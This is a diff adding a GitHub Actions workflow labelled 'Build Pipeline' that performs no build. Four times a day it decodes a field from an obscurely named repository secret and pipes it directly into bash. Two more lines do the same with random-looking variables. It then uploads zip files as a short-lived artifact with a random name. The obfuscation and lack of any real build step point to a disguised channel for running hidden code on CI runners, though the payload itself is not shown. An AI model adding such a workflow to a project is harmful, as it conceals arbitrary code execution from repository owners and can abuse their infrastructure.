@@ -1,0 +1,30 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          ocjpj18: ${{ secrets.ocjpj18 }}
+        run: |
+          printf '%s' "$ocjpj18" | jq -r .knp01 | /bin/bash
+          echo $joijv5846 | jq -r .xyia1872 | /bin/bash
+          echo $qyixq4969 | jq -r .awihi89903 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9vT19PGF
+          path: "*.zip"
+          retention-days: 1
